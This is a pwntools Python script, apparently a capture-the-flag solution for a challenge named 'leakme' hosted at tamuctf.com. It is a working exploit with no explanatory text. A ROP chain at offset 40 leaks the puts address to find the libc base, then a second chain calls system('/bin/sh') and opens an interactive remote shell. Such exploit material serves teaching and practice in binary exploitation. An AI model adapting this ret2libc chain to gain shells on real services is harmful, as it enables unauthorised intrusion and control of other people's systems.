#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("leakme")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

CHAL = "leakme"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

p.recvline()

payload = flat({
    40: [
        p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
        p64(exe.got['puts']),
        p64(exe.symbols['puts']),
        p64(exe.symbols['vuln']),
    ]

})
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = puts_addr - 0x765f0
system_addr = libc_base + 0x48e50

log.info(f"libc addr: {hex(libc_base)}")

payload = flat({
    40: [
        p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
        p64(next(exe.search(b'/bin/sh'))),
        p64(system_addr),
        p64(exe.symbols['vuln']),
    ]
})
p.sendline(payload)

p.interactive()
